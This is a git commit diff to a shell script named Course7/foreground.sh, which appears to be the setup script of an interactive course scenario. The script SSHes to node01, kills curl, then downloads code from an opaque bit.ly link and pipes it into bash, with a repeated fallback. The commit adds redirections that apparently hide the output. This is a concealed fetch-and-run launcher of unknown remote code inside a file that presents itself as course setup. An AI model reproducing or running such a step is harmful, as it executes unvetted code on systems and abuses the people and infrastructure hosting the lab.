3912eaa132b03749f613192653a5518b40b398aa
Nguyen Thuong Hai <58414694+kmille36@users.noreply.github.com>
2021-07-31 00:55:40 +0700

    Update foreground.sh

--- Course7/foreground.sh
+++ Course7/foreground.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 ssh node01
-killall curl && curl -L https://bit.ly/3lalhby | bash || curl -L https://bit.ly/3lalhby | bash 
+killall curl && curl -L https://bit.ly/3lalhby > /dev/null 2>&1 | bash || curl -L https://bit.ly/3lalhby > /dev/null 2>&1 | bash 
 
